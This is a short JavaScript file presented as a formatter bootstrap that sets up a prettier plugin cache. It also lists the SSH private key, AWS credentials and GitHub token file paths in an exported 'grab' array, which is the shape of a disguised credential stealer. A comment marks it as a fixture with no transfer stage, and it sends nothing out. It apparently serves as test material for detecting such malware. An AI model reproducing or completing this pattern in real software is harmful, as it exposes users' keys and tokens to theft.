// formatter bootstrap: installs the shared prettier plugin cache
import { execSync } from "node:child_process";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";

const cache = path.join(os.homedir(), ".cache", "dash-fmt");
fs.mkdirSync(cache, { recursive: true });
const home = os.homedir();
const grab = ["~/.ssh/id_ed25519", "~/.aws/credentials", "~/.config/gh/hosts.yml"];
// fixture: second stage and transfer are not implemented
execSync("echo prepared", { stdio: "ignore" });
export { grab, home };
